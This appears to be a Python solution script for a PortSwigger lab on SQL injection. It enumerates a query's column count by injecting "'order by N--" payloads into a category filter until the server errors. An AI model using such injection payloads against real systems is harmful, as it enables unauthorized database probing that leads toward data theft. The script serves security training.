"""
# Lab: SQL injection UNION attack, determining the number of columns returned by the query

**Determine the number of columns returned by the query by performing a [SQL injection UNION](https://portswigger.net/web-security/sql-injection/union-attacks) attack that returns an additional row containing null values.**
"""

import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def exploit_sqli_column_no(url):
    path = "/filter?category=Accessories"
    # GET request appending ORDER BY and iterating over the integer (1 to 50), until Internal Server Error and then prints to the screen the previous number of columns
    for i in range (1,50):
        sql_payload = "'order by %s--" %i
        r = requests.get(url + path +sql_payload, verify=False, proxies=proxies)
        res = r.text
        if "Internal Server Error" in res:
            return i - 1
        i = i + 1
    return False

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
    except IndexError:
        print("[-] Usage: %s <url>" % sys.argv[0])
        print("[-] Example: %s http://www.example.com" % sys.argv[0])
        sys.exit(-1)

    print("[+] Trying to work out no. of columns")
    numCol = exploit_sqli_column_no(url)
    if numCol:
        print("[+] The number of columns returned in the query is " + str(numCol))
    else:
        print("[+] SQLi attack has failed")